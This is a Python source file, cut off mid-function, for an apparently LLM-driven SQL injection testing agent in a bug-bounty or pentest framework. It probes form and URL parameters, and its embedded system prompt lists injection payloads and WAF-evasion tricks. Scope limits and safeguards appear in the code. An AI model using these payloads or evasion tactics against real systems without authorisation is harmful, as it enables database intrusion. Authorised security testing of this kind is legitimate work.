#!/usr/bin/env python3
import logging
import asyncio
import re
import json
import time
from typing import Dict, Any, Tuple, Optional, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from src.core.agents.swarm.thought_loop import ThoughtLoop, ThoughtStep
from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.models.llm import LLMClient
from src.core.infra.network_client import AsyncNetworkClient
from src.core.infra.smart_request import SmartRequest
from src.core.utils.oob_listener import get_oob_listener

logger = logging.getLogger(__name__)

async def _fetch_and_parse_form(url: str, auth_headers: Dict[str, str]) -> List[Dict[str, Any]]:
    """
    HTML を取得して BeautifulSoup でフォームを解析（高速・第一選択）
    
    Args:
        url: 対象 URL
        auth_headers: 認証ヘッダー
        
    Returns:
        フォーム情報のリスト
    """
    from bs4 import BeautifulSoup

    forms = []
    try:
        client = AsyncNetworkClient()
        resp = await client.request("GET", url, headers=auth_headers)
        # resp は辞書：{"status": 200, "body": "...", "headers": {...}}
        body = resp.get("body", "") if isinstance(resp, dict) else getattr(resp, "text", "")
        soup = BeautifulSoup(body, "html.parser")
        
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            
            inputs = []
            for input_elem in form.find_all(["input", "select", "textarea"]):
                name = input_elem.get("name")
                if name:
                    input_type = input_elem.get("type", "text")
                    value = input_elem.get("value", "1")
                    inputs.append({"name": name, "type": input_type, "value": value})
            
            forms.append({
                "action": action,
                "method": method,
                "inputs": inputs
            })
        
        await client.close()
    except Exception as e:
        logger.debug(f"[SmartSQLiHunter] HTML form parsing failed for {url}: {e}")
    
    return forms

class SmartSQLiHunter(Specialist, ThoughtLoop):
    """
    Stateful Loop-based Agent for SQL Injection (The Brain).

    Strategies:
    1. Probe: Check parameter reflections and error messages.
    2. Hypothesize: Determine DB type (MySQL, Postgres, etc.) and error type.
    3. Exploit: Craft payloads (UNION, Error-based, Time-based) based on hypothesis.
    4. Verify: Confirm vulnerability.

    MEDIUM/HIGH SECURITY AWARENESS:
    - If input characters like ' or \" are filtered, use numeric injections (e.g., id=1 OR 1=1).
    - If the target is a POST form with dropdowns/radio buttons, manipulate the raw POST values.
    - Test for blind SQLi using conditional timing (SLEEP/BENCHMARK) if no errors are visible.
    """

    name = "SmartSQLiHunter"
    description = "Stateful reasoning agent for deep SQLi detection."
    MAX_PARAMS_TO_TEST = 5
    EXCLUDED_PARAM_NAMES = {"scan_profile", "profile", "_auth", "method"}
    NON_ATTACK_PARAM_NAMES = {"submit", "change", "token", "csrf", "csrf_token", "user_token"}
    # SGK-2026-0451: protocol-level noise params (socket.io handshake) —
    # framework/protocol knowledge, not product-specific. Excluded from
    # attack candidates only on the opt-in fire path.
    NOISE_PARAM_NAMES = {"eio", "transport"}
    CRITICAL_PARAM_HINTS = {
        "id", "user_id", "uid", "account_id", "order_id", "product_id", "item_id", "username"
    }
    # SGK-2026-0452: the complete, closed set of extraction expressions —
    # DB metadata version functions only (no user data / credentials / PII).
    # _version_expr_for_db() derives every extraction expression from this
    # set; the values are the ONLY expressions ever extracted (test-enforced).
    NON_SENSITIVE_EXTRACTION_EXPRS = frozenset({
        "sqlite_version()",
        "version()",
        "@@VERSION",
    })

    @classmethod
    def _is_excluded_param(cls, name: str) -> bool:
        return str(name or "").strip().lower() in cls.EXCLUDED_PARAM_NAMES

    @classmethod
    def _is_non_attack_param(cls, name: str) -> bool:
        return str(name or "").strip().lower() in cls.NON_ATTACK_PARAM_NAMES

    @classmethod
    def _is_noise_param(cls, name: str) -> bool:
        return str(name or "").strip().lower() in cls.NOISE_PARAM_NAMES

    SYSTEM_PROMPT = """You are an expert SQL Injection Penetration Tester.
You must work in a thought loop to detect SQL injection vulnerabilities.

Commands:
- ACTION: request
  INPUT: [The payload]

- ACTION: finish
  INPUT: [vulnerable|safe|unknown]

CRITICAL FORMAT RULES (VIOLATION = IMMEDIATE RETRY):
1. You MUST use EXACTLY this format for EVERY turn:
   THOUGHT: [Your reasoning]
   ACTION: [request|finish]
   INPUT: [payload or vulnerable/safe/unknown]

2. NEVER write "Observation:" or "observation" - this is PROVIDED BY THE TOOL after your Action.
3. NEVER write "Final Answer:" or "Conclusion:" - use "ACTION: finish" instead.
4. NEVER fabricate tool outputs or observations.
5. If you write invalid format, the system will FORCE RETRY.

Guidelines:
1. If basic quotes (' or ") are escaped (e.g. Medium level security), try numeric payloads that don't require quotes (e.g. 1 OR 1=1).
2. For dropdowns or numeric IDs, test for Boolean-based differences using arithmetic or conditional logic (e.g. id=1+0 vs id=1+1).
3. If a WAF is suspected, use encoding (URL, hex, unicode) or whitespace manipulation (e.g. /**/, %0a).
4. Use standard SQL error messages to identify the database type (MySQL, PostgreSQL, etc.).
5. Test for time-based blind SQLi if no immediate differences are found (e.g. ' OR SLEEP(5)--).
6. Support for POST forms and JSON bodies is available. If methodology involves POST, payloads will be placed in the body.

VULNERABILITY DETECTION CRITERIA:
- If you see SQL error messages (e.g., "SQL syntax", "MariaDB", "MySQL", "ORA-", "PostgreSQL"), the target IS VULNERABLE.
- If you see "Fatal error" or "mysqli_sql_exception" in the response, the target IS VULNERABLE.
- When you confirm vulnerability, immediately use "ACTION: finish" with INPUT: "vulnerable" and include evidence in your THOUGHT.

Refinement:
Always analyze the 'Observation' which contains status, diff, and a snippet of the response body.
If you see SQL error messages, focus on error-based exploitation.
If the response length or status changes slightly, focus on boolean-based blind exploitation.

Format:
THOUGHT: [Reasoning about the next payload strategy based on previous observations]
ACTION: [Command]
INPUT: [Input]
"""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        Specialist.__init__(self, config)
        ThoughtLoop.__init__(self, max_turns=8)

        # Resolve run mode: config["mode"] (truthy) > global settings.mode >
        # "bugbounty". Prevents Guard fail-close on vulntest/ctf runs.
        from src.core.config.settings import resolve_run_mode
        mode = resolve_run_mode(
            config.get("mode") if (config and isinstance(config, dict)) else None
        )

        self.llm = LLMClient(role="sqli_specialist")

        # Network Setup
        proxy_manager = None
        try:
            from src.core.infra.proxy_manager import get_proxy_manager
            proxy_manager = get_proxy_manager()
        except ImportError:
            pass

        from src.core.security.execution_safeguard import get_execution_safeguard

        base_client = AsyncNetworkClient(proxy_manager=proxy_manager, mode=mode)
        safeguard = get_execution_safeguard(mode=mode)
        self.smart_client = SmartRequest(base_client, execution_safeguard=safeguard)

        # State for loop
        self.vulnerable = False
        self.evidence = ""
        self.used_payloads = []
        self.history_messages = []
        self.last_tested_params: List[str] = []
        self.last_blind_correlation: Dict[str, Any] = {}
        self._max_observed_latency = 0.0
        self._time_signal_payload = ""
        self._time_signal_latency = 0.0
        self._time_signal_timing_samples: Dict[str, Any] = {}
        self._consecutive_blocked_observations = 0
        self._no_signal_turns = 0
        self._last_poc_request = ""
        self._last_poc_response = ""
        self._sql_error_observed = False
        self._sql_error_evidence: Dict[str, Any] = {}
        self._response_differential: Dict[str, Any] = {}
        # SGK-2026-0452: evidence-chain coherence — the error-observation PoC
        # pair is pinned once observed and never overwritten by later
        # (successful) probes; impact_probe_records carries the observed
        # boolean/extraction demonstration facts (shared contract with
        # injection_evidence_fields.py).
        self._error_poc_request = ""
        self._error_poc_response = ""
        self._impact_probe_records: Dict[str, Any] = {}
        # SGK-2026-0451: deterministic fire-path state (opt-in).
        self._probe_sent = False
        self._last_probe_sent: Optional[bool] = None

    def _compute_adaptive_turn_budget(
        self,
        quick_mode: bool,
        candidate_count: int,
        param_name: str,
        target_url: str = "",
    ) -> int:
        base = 4 if quick_mode else 6
        normalized_param = str(param_name or "").strip().lower()
        if normalized_param in self.CRITICAL_PARAM_HINTS:
            base += 2
        target_lower = str(target_url or "").lower()
        if "sqli_blind" in target_lower and base < 7:
            base += 1
        if candidate_count >= 4:
            base -= 1
        return max(4, min(8, base))

    async def close(self):
        """リソース解放"""
        if self.smart_client and hasattr(self.smart_client, "client"):
            await self.smart_client.client.close()

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        """
        Specialist としてのエントリーポイント
        
        Args:
            task: タスク情報
            quick_mode: True の場合、ThoughtLoop のターン数を制限して高速化
        """
        logger.info(f"[{self.name}] Starting ThoughtLoop for {task.target} (quick_mode={quick_mode})")

        # quick_mode の場合はターン数を絞る（run_as_tool 側でパラメータ別に適応補正）
        original_max_turns = self.max_turns
        if quick_mode:
            self.max_turns = 4

        # run_as_tool 内でパラメータ数に応じた turn budget を算出するため保持
        self.context["quick_mode"] = quick_mode

        # タイムアウト制御付きで実行（Layer 2 リトライを考慮して延長）
        # quick_mode: 120 秒→300 秒、通常：240 秒→600 秒
        timeout = 300 if quick_mode else 600
        try:
            result = await asyncio.wait_for(
                self.run_as_tool(task.target, task.params),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            logger.warning(f"[{self.name}] Timeout after {timeout}s for {task.target}")
            return []
        finally:
            # max_turns を元に戻す
            self.max_turns = original_max_turns
            self.context.pop("quick_mode", None)

        findings = []
        blind_correlation = result.get("blind_correlation", {}) or {}
        time_based = blind_correlation.get("time_based", {}) if isinstance(blind_correlation, dict) else {}
        blind_time_based_confirmed = bool(time_based.get("confirmed", False))
        target_lower = str(task.target or "").lower()
        forced_blind_detection = (
            not bool(result.get("vulnerable", False))
            and "sqli_blind" in target_lower
            and blind_time_based_confirmed
        )

        # SGK-2026-0451 (opt-in fire path): a complete sql_error observation
        # (marker + PoC pair) from the deterministic fire path produces a
        # candidate finding even when the LLM loop already finished. Same
        # evidence/fill machinery as before; the AI judge is untouched and
        # may still refute error-only candidates (fail-closed).
        sql_error_fire = (
            self._firing_path_enabled()
            and not bool(result.get("vulnerable", False))
            and bool(result.get("sql_error_observed", False))
            and bool(result.get("poc_request", ""))
        )

        if result.get("vulnerable") or forced_blind_detection or sql_error_fire:
            evidence_text = str(result.get("evidence", "") or "").strip()
            if forced_blind_detection:
                payload = str(time_based.get("payload", "") or "")
                observed_latency = float(time_based.get("observed_latency_seconds", 0.0) or 0.0)
                expected_delay = float(time_based.get("expected_delay_seconds", 0.0) or 0.0)
                evidence_text = (
                    "Time-based blind SQLi signal confirmed "
                    f"(payload='{payload}', observed_latency={observed_latency:.2f}s, "
                    f"expected_delay={expected_delay:.2f}s)."
                )
            if sql_error_fire and not evidence_text:
                _see = result.get("sql_error_evidence", {})
                if not isinstance(_see, dict):
                    _see = {}
                evidence_text = (
                    "SQL error observed: "
                    f"{str(_see.get('details', '') or '')} "
                    f"(body: {str(_see.get('body_snippet', '') or '')[:200]})"
                )
            # SGK-2026-0452 A-3/A-5 (opt-in, layered on the 0451 fire path):
            # when the impact-demo gate is on and a real sql_error observation
            # exists, the evidence body is the RAW observed SQL error response
            # excerpt — never an LLM claim. This keeps primary evidence
            # (poc_judge rule 1), the `sql_error` marker match (payout_grade)
            # and the replay marker (sealed reproduction checker) all anchored
            # to the same one request. forced_blind keeps its own time-based
            # signal description (no error-based mixing).
            evidence_body = evidence_text
            if self._impact_demo_enabled() and not forced_blind_detection:
                if bool(result.get("sql_error_observed", False)):
                    _see = result.get("sql_error_evidence", {})
                    if not isinstance(_see, dict):
                        _see = {}
                    raw_body = str(_see.get("body_snippet", "") or "")
                    if raw_body:
                        evidence_body = raw_body
            # SGK-2026-0452 (opt-in): pin the recorded payload to the
            # error-observation probe so additional_info matches the impact.
            info_payload = (result.get("payloads_used") or [""])[-1]
            if self._impact_demo_enabled() and bool(result.get("sql_error_observed", False)):
                _see = result.get("sql_error_evidence", {})
                if not isinstance(_see, dict):
                    _see = {}
                _see_payload = str(_see.get("payload", "") or "")
                if _see_payload:
                    info_payload = _see_payload
            # SGK-2026-0449 Scope B: observed-request evidence + impact/repro
            # fill for error-based SQLi findings (fail-closed: without a
            # complete sql_error observation everything stays as before).
            observed, impact, reproduction_steps = _build_sqli_evidence_and_impact(
                result, task.target
            )
            finding = Finding(
                vuln_type=VulnType.SQLI,
                severity=Severity.HIGH,
                title=f"SQL Injection in parameter '{result.get('param', 'unknown')}'",
                description=(
                    "Time-based blind SQL Injection confirmed."
                    if forced_blind_detection
                    else (
                        "SQL Injection detected (error-based)."
                        if sql_error_fire
                        else result.get("description", "Detected by SmartSQLiHunter.")
                    )
                ),
                target_url=task.target,
                evidence=Evidence(
                    request_url=observed.get("request_url") or task.target,
                    request_method=observed.get("request_method") or "",
                    response_status=observed.get("response_status") or 0,
                    response_body=evidence_body
                ),
                source_agent=self.name,
                confidence=0.9,
                tags=["sqli", "smart_agent"],
                additional_info={
                    "parameter": result.get("param"),
                    "payload": info_payload,
                    "payloads_used": result.get("payloads_used", []) or [],
                    "tested_params": result.get("tested_params", []),
                    "blind_correlation": blind_correlation,
                    "blind_time_based_confirmed": blind_time_based_confirmed,
                    "sql_error_observed": bool(result.get("sql_error_observed", False)),
                    "sql_error_evidence": result.get("sql_error_evidence", {}),
                    "response_differential": result.get("response_differential", {}),
                    "poc_request": str(result.get("poc_request", "") or ""),
                    "poc_response": str(result.get("poc_response", "") or ""),
                },
                impact=impact or "",
                reproduction_steps=reproduction_steps or [],
            )
            findings.append(finding)

        return findings

    async def run_as_tool(self, url: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Manager から呼び出し可能な Tool メソッド。
        フォーム情報が含まれる場合、POST パラメータとして抽出する。
        """
        params = params or {}
        _auth = params.get("_auth", {})
        auth_headers = _auth.get("auth_headers", {})
        cookies_str = _auth.get("cookies", "")
        if cookies_str and "Cookie" not in auth_headers:
            auth_headers["Cookie"] = cookies_str

        method = params.get("method", "GET").upper()
        target = url

        META_KEYS = {
            "_auth",
            "target", "url", "vuln_type", "manager_timeout_seconds",
            "per_url_timeout_seconds", "phase1_timeout_retries", "manager_phase1_early_return",
            "targets", "targets_file", "source_file", "cookies",
            "tags", "category", "_context", "extra_targets",
            "auth_headers", "headers", "count", "forms", "scan_profile", "profile",
        }
        # SGK-2026-0451 (opt-in fire path): internal meta keys
        # (url_evidence / detection_mode) must never leak into attack payload
        # params. The base META_KEYS stays untouched when the fire path is
        # off (byte-equivalent default).
        firing_path_enabled = self._firing_path_enabled()
        # SGK-2026-0452 (opt-in impact demonstration): layered on the 0451
        # fire path — the demo gate requires firing ON AND the impact probe
        # flag ON. Default off -> byte-identical 0451 behavior.
        impact_demo_enabled = self._impact_demo_enabled()
        meta_keys = (
            META_KEYS | {"url_evidence", "detection_mode"}
            if firing_path_enabled
            else META_KEYS
        )
        payload_params = {k: v for k, v in params.items() if k not in meta_keys}

        parsed = urlparse(target)
        url_params = parse_qs(parsed.query)
        url_params_flat = {k: v[0] if v else "" for k, v in url_params.items()}

        # フォーム情報を事前に初期化（スコープ問題回避）
        forms = params.get("forms", [])
        
        if not payload_params:
            # フォーム情報が提供されている場合、それを優先
            if forms:
                for form in forms:
                    form_method = form.get("method", "GET").upper()
                    if form_method == "POST":
                        method = "POST"
                    for input_field in form.get("inputs", []):
                        param_name = input_field.get("name", "")
                        if param_name and not self._is_excluded_param(param_name):
                            # 初期値を設定（SQLi テスト用）
                            payload_params[param_name] = input_field.get("value", "1")
                logger.info("[%s] Extracted %d params from provided forms: %s",
                           self.name, len(payload_params), list(payload_params.keys()))

        # フォーム情報が提供されていない、または追加のフォームパラメータがある場合、HTML パースでフォームを検出（常に実行）
        forms_from_html = await _fetch_and_parse_form(target, auth_headers)
        if forms_from_html:
            for form in forms_from_html:
                form_method = form.get("method", "GET").upper()
                if form_method == "POST":
                    method = "POST"
                for input_field in form.get("inputs", []):
                    param_name = input_field.get("name", "")
                    # 既存のパラメータを上書きしない（LLM の推測を優先）
                    if (
                        param_name
                        and not self._is_excluded_param(param_name)
                        and param_name not in payload_params
                    ):
                        payload_params[param_name] = input_field.get("value", "1")
            if forms_from_html:
                logger.info("[%s] Extracted %d additional params from HTML forms: %s",
                           self.name, len(payload_params), list(payload_params.keys()))
        
        forms = forms or forms_from_html  # forms 変数を更新

        # HTML パースでもフォームがない場合、URL クエリから取得
        if not payload_params and url_params_flat:
            payload_params = {
                key: value
                for key, value in url_params_flat.items()
                if not self._is_excluded_param(key)
            }

        # 全てダメな場合、Playwright でフォームを検出（最終フォールバック）
        if not payload_params:
            try:
                from src.tools.browser.playwright_validator import PlaywrightValidator
                pw_forms = await PlaywrightValidator().extract_forms(
                    target,
                    timeout=10.0,
                    cookies=[{"name": c.split("=")[0].strip(), "value": c.split("=")[1].strip(), "domain": urlparse(target).hostname, "path": "/"}] if cookies_str else None
                )
                if pw_forms:
                    for form in pw_forms:
                        if form.get("method", "get").upper() == "POST":
                            method = "POST"
                        for input_field in form.get("inputs", []):
                            param_name = input_field.get("name", "")
                            if param_name and not self._is_excluded_param(param_name):
                                payload_params[param_name] = "1"
                    logger.info("[%s] Extracted %d params from Playwright forms: %s",
                               self.name, len(payload_params), list(payload_params.keys()))
            except Exception as e:
                logger.debug("[%s] Playwright form extraction failed: %s", self.name, e)

        # forms 変数を常に初期化
        if 'forms' not in locals():
            forms = []

        # SGK-2026-0451 (opt-in fire path): generic noise exclusion (socket.io
        # handshake params) + generic priority — params actually present in
        # THIS url's query first, then form-derived, then discovery hints.
        # No product-specific name priority table (no curve fitting).
        # keep_blank_values: a real param may legitimately carry an empty
        # value (e.g. ?q=) and must still count as present-in-URL.
        if firing_path_enabled:
            fire_url_params = parse_qs(parsed.query, keep_blank_values=True)
            fire_url_params_flat = {
                k: (v[0] if v else "") for k, v in fire_url_params.items()
            }
            candidate_params = self._prioritize_candidate_params_generic(
                payload_params, fire_url_params_flat
            )
        else:
            candidate_params = [
                name for name in list(payload_params.keys())
                if not self._is_excluded_param(name) and not self._is_non_attack_param(name)
            ][:self.MAX_PARAMS_TO_TEST] if payload_params else []
        quick_mode_flag = bool(self.context.get("quick_mode", False))
        tested_params: List[str] = []
        self.last_tested_params = tested_params
        self.last_blind_correlation = {}
        self._max_observed_latency = 0.0
        self._time_signal_payload = ""
        self._time_signal_latency = 0.0
        self._time_signal_timing_samples = {}
        self._consecutive_blocked_observations = 0
        self._no_signal_turns = 0
        self._last_poc_request = ""
        self._last_poc_response = ""
        self._sql_error_observed = False
        self._sql_error_evidence = {}
        self._response_differential = {}
        self._error_poc_request = ""
        self._error_poc_response = ""
        self._impact_probe_records = {}
        self._probe_sent = False
        loop_result: Dict[str, Any] = {"status": "not_run", "reason": "no_parameters"}

        for param_name in candidate_params:
            tested_params.append(param_name)
            original_param_max_turns = self.max_turns
            self.max_turns = self._compute_adaptive_turn_budget(
                quick_mode_flag,
                len(candidate_params),
                param_name,
                target,
            )
            logger.debug(
                "[%s] Adaptive turn budget for param '%s': %d (candidates=%d)",
                self.name,
                param_name,
                self.max_turns,
                len(candidate_params),
            )

            # ThoughtLoop コンテキスト設定
            self.context = {
                "target": target,
                "param": param_name,
                "method": method,
                "params": payload_params,
                "auth_headers": auth_headers,
                "cookies": cookies_str,
                "forms": forms if forms else [],
            }

            # State 初期化
            self.vulnerable = False
            self.evidence = ""
            self.used_payloads = []
            self.history_messages = []
            if "sqli_blind" in target.lower():
                precheck = await self._run_time_based_blind_precheck(
                    param_name=param_name,
                    baseline_value=payload_params.get(param_name, "1"),
                )
                if precheck.get("confirmed"):
                    self.vulnerable = True
                    self.evidence = (
                        "Time-based blind SQLi signal confirmed "
                        f"(payload='{precheck.get('payload', '')}', "
                        f"baseline={precheck.get('baseline_latency_seconds', 0.0):.2f}s, "
                        f"observed={precheck.get('observed_latency_seconds', 0.0):.2f}s)."
                    )
                    loop_result = {
                        "status": "blind_precheck_confirmed",
                        "param": param_name,
                        **precheck,
                    }
                    self.max_turns = original_param_max_turns
                    break
            # SGK-2026-0451 (opt-in fire path): deterministic first-fire —
            # send error-based probes to this discovered parameter BEFORE the
            # LLM loop and feed the observation into the loop context. Firing
            # is guaranteed even if the LLM finishes immediately; the adaptive
            # loop (full payload freedom) stays untouched.
            if firing_path_enabled:
                probe_observation = await self._fire_error_based_probe(
                    param_name,
                    payload_params.get(param_name, "1") if payload_params else "1",
                )
                self.context["probe_observation"] = probe_observation
            self.history_messages.append({"role": "system", "content": self.SYSTEM_PROMPT})

            probe_observation = str(self.context.get("probe_observation", "") or "")
            initial_prompt = f"""Target URL: {target}
Method: {method}
Parameter: {param_name}
Original Value: {payload_params.get(param_name, '') if payload_params else ''}

{('Deterministic probe observation:\n' + probe_observation + '\n\n') if probe_observation else ''}Start your SQL injection testing.
"""
            self.history_messages.append({"role": "user", "content": initial_prompt})

            # ThoughtLoop を実行（親クラスの run_loop を使用）
            try:
                loop_result = await self.run_loop(self.context)
            except Exception as e:
                logger.error(f"[{self.name}] ThoughtLoop failed for param {param_name}: {e}")
                loop_result = {"status": "failed", "error": str(e), "param": param_name}
            finally:
                self.max_turns = original_param_max_turns

            if self.vulnerable:
                break

        blind_correlation = self._build_blind_correlation(self.used_payloads)
        self.last_blind_correlation = blind_correlation

        # SGK-2026-0451 (opt-in fire path): surface the deterministic
        # fire-path record for the manager's url_result wiring. Keys are
        # added ONLY when the fire path is enabled (byte-equivalent default).
        self._last_probe_sent = self._probe_sent if firing_path_enabled else None
        result: Dict[str, Any] = {
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "param": self.context.get("param"),
            "tested_params": tested_params,
            "payloads_used": self.used_payloads,
            "description": f"SQL Injection detected." if self.vulnerable else "No SQL Injection detected.",
            "loop_result": loop_result,
            "blind_correlation": blind_correlation,
            "sql_error_observed": self._sql_error_observed,
            "sql_error_evidence": self._sql_error_evidence,
            "response_differential": self._response_differential,
            "poc_request": self._last_poc_request,
            "poc_response": self._last_poc_response,
        }
        # SGK-2026-0452 (opt-in, layered on the 0451 fire path): pin the
        # result PoC pair to the ERROR-OBSERVATION probe (A-2) so evidence
        # URL/status/body and the impact payload/status all belong to ONE
        # observed request (0451 contradictions ①/④ become structurally
        # impossible). The pinned pair is used only when the demo gate is on;
        # otherwise _last_poc_* wins (byte-identical 0451).
        if impact_demo_enabled and self._sql_error_observed and self._error_poc_request:
            result["poc_request"] = self._error_poc_request
            result["poc_response"] = self._error_poc_response
        if impact_demo_enabled:
            result["impact_probe_records"] = dict(self._impact_probe_records)
        if firing_path_enabled:
            result["probe_sent"] = self._probe_sent
            result["probe_request_raw"] = self._last_poc_request
            result["probe_response_raw"] = self._last_poc_response
        return result

    def _build_specialist_tool_schema(self) -> List[Dict[str, Any]]:
        """SGK-2026-0450 A: SmartSQLiHunter 専用ツールスキーマ（tool-calling 用）。

        ペイロードは自由文字列のまま（能力を狭めない）。request / finish の2ツールのみ。
        act() は既存の finish/request 文字列分岐をそのまま使う（配線置換のみ）。
        """
        return [
            {
                "type": "function",
                "function": {
                    "name": "request",
                    "description": (
                        "Send a SQL injection payload to the target parameter and observe the response."
                    ),
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "payload": {
                                "type": "string",
                                "description": (
                                    "SQL injection payload (any form: error-based, boolean, union, "
                                    "time-based, etc.)"
                                ),
                            }
                        },
                        "required": ["payload"],
                    },
                },
            },
            {
                "type": "function",
                "function": {
                    "name": "finish",
                    "description": "Conclude the SQL injection test with a summary.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "summary": {
                                "type": "string",
                                "description": (
                                    "Conclusion. Include 'vulnerable'/'found'/'confirmed' if a "
                                    "vulnerability was detected, otherwise state it is safe."
                                ),
                            }
                        },
                        "required": ["summary"],
                    },
                },
            },
        ]

    async def decide(self, turn: int) -> Tuple[str, str, Any]:
        """
        LLM decides the next move (ThoughtLoop abstract method).
        
        LLM の出力を検証し、不正な形式（Observation の自己生成など）を検出したらリトライ。
        """
        history_lines = []
        for s in self.history:
            if hasattr(s, "turn"):
                history_lines.append(
                    f"Turn {s.turn}: Act={s.action}({s.action_input}) -> {s.observation}"
                )
            elif isinstance(s, dict):
                history_lines.append(
                    f"Turn {s.get('turn', '?')}: Act={s.get('action', '?')}({s.get('action_input', s.get('input', ''))}) -> {s.get('observation', '')}"
                )
        history_text = "\n".join(history_lines)

        # SGK-2026-0451 (opt-in fire path): surface the deterministic probe
        # observation to the LLM loop so it can adapt on top of it. Empty
        # when the fire path is off (byte-equivalent default).
        probe_obs = str(self.context.get("probe_observation", "") or "")
        pre_probe_block = f"Pre-probe observation:\n{probe_obs}\n\n" if probe_obs else ""
        prompt = f"""Target: {self.context['target']}
Testing Parameter: {self.context['param']}
Method: {self.context['method']}
Current Turn: {turn}

History:
{history_text if history_text else 'No previous actions'}

{pre_probe_block}Decide next step for SQL injection testing.
"""
        # SGK-2026-0450 A: tool-calling 分岐（既定 OFF → 既存 regex パスを byte 等価維持）
        use_tool_calling = bool(self.context.get("tool_calling", False))
        if not use_tool_calling:
            try:
                from src.core.config.settings import get_settings
                use_tool_calling = bool(getattr(get_settings(), "tool_calling_enabled", False))
            except Exception:
                use_tool_calling = False

        if use_tool_calling:
            response = await self.llm.agenerate(
                [
                    {"role": "system", "content": self.SYSTEM_PROMPT},
                    {"role": "user", "content": prompt}
                ],
                tools=self._build_specialist_tool_schema(),
                tool_loop=False,
            )
            _msg = response.choices[0].message if response and response.choices else None
            tool_calls = getattr(_msg, "tool_calls", None) or []
            if tool_calls:
                _fn = getattr(tool_calls[0], "function", None)
                _name = getattr(_fn, "name", "") or ""
                _raw_args = getattr(_fn, "arguments", None) or "{}"
                _args: Dict[str, Any] = {}
                if isinstance(_raw_args, str):
                    try:
                        _parsed = json.loads(_raw_args)
                        if isinstance(_parsed, dict):
                            _args = _parsed
                    except (TypeError, ValueError, json.JSONDecodeError):
                        _args = {}
                elif isinstance(_raw_args, dict):
                    _args = _raw_args
                if _name == "request":
                    payload = str(_args.get("payload", "") or "")
                    if payload:
                        logger.info("Turn %d: tool call 'request' with payload (len=%d)", turn, len(payload))
                        return (f"Turn {turn}: sending payload via tool call", "request", payload)
                    logger.warning("Turn %d: request tool call with empty payload. Falling back to text parsing.", turn)
                elif _name == "finish":
                    summary = str(_args.get("summary", "safe") or "safe")
                    logger.info("Turn %d: tool call 'finish' with summary=%r", turn, summary)
                    return (f"Turn {turn}: finishing via tool call", "finish", summary)
                else:
                    logger.warning("Turn %d: unknown tool call '%s'. Falling back to text parsing.", turn, _name)
            # tool_calls が無い/無効な場合は既存の Free-text パースへフォールバック
            content = getattr(_msg, "content", "") or "" if _msg is not None else ""
        else:
            response = await self.llm.agenerate([
                {"role": "system", "content": self.SYSTEM_PROMPT},
                {"role": "user", "content": prompt}
            ])
            content = response.choices[0].message.content if response and response.choices else ""

        # フォールバック
        if not content:
            logger.warning(f"Turn {turn}: LLM returned empty content. Forcing finish.")
            return "Analysis complete (LLM empty)", "finish", "safe"

        # Layer 2: LLM 出力の厳密な検証
        # Observation を含んでいたらエラー（再試行）
        if "Observation:" in content or "observation" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Observation:'! This is invalid. Forcing retry...")
            # 履歴にエラーメッセージを追加して再試行
            self.history.append({
                "role": "user",
                "content": "ERROR: You wrote 'Observation:' in your output. This is INVALID. "
                          "Do NOT write 'Observation:' yourself. Observation is PROVIDED BY THE TOOL after your Action. "
                          "Your output should ONLY contain THOUGHT, ACTION, and INPUT. Please retry."
            })
            # 再帰的に呼び出してリトライ（最大 3 回まで）
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (LLM wrote invalid Observation)", "finish", "safe"

        # Final Answer など、不正な形式も検出
        if "Final Answer:" in content or "final answer" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Final Answer:'! This should be 'ACTION: finish'. Forcing retry...")
            self.history.append({
                "role": "user",
                "content": "ERROR: You wrote 'Final Answer:' in your output. This is INVALID. "
                          "Use 'ACTION: finish' instead of 'Final Answer:'. Please retry."
            })
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (LLM wrote invalid format)", "finish", "safe"

        # Parse
        thought = "Analyzing..."
        action = "finish"
        action_input = "safe"

        thought_match = re.search(r'THOUGHT:\s*(.+?)(?=\nACTION:|$)', content, re.DOTALL | re.IGNORECASE)
        action_match = re.search(r'ACTION:\s*([a-zA-Z_]+)', content, re.IGNORECASE)
        input_match = re.search(r'INPUT:\s*(.+)', content, re.IGNORECASE)

        if thought_match:
            thought = thought_match.group(1).strip()
        if action_match:
            action = action_match.group(1).strip().lower()
        if input_match:
            action_input = input_match.group(1).strip()

        return thought, action, action_input

    async def act(self, action: str, action_input: Any) -> str:
        """Execute action (ThoughtLoop abstract method)."""
        # 複数の終了アクション形式を許可
        if action in ["finish", "final", "final_answer", "conclusion"]:
            action_input_lower = str(action_input).lower()
            # 脆弱性検出の複数の表現を許可
            if any(kw in action_input_lower for kw in ["vulnerable", "found", "confirmed", "detected", "success"]):
                self.vulnerable = True
                self.evidence = str(action_input)
            return f"Finished: {action_input}"

        if action == "request":
            payload = str(action_input)
            self.used_payloads.append(payload)

            # リクエスト送信
            obs = await self._send_request(payload)
            diff_type = str(obs.get("diff", "")).lower()
            if obs.get("poc_request"):
                self._last_poc_request = str(obs.get("poc_request", "") or "")
            if obs.get("poc_response"):
                self._last_poc_response = str(obs.get("poc_response", "") or "")
            if diff_type in {"blocked", "error"}:
                self._consecutive_blocked_observations += 1
            else:
                self._consecutive_blocked_observations = 0

            # SGK-2026-0451: sql_error marker / evidence recording is shared
            # with the deterministic fire path (same logic, byte-identical).
            self._record_sql_observation(obs, payload, diff_type)

            elapsed = float(obs.get("elapsed_seconds", 0.0) or 0.0)
            if elapsed > self._max_observed_latency:
                self._max_observed_latency = elapsed
            if self._looks_like_time_payload(payload):
                threshold = max(3.0, self._estimate_expected_delay(payload) * 0.7)
                if elapsed >= threshold and elapsed > self._time_signal_latency:
                    self._time_signal_payload = payload
                    self._time_signal_latency = elapsed

            if diff_type == "normal" and elapsed < 2.0:
                self._no_signal_turns += 1
            else:
                self._no_signal_turns = 0

            return (
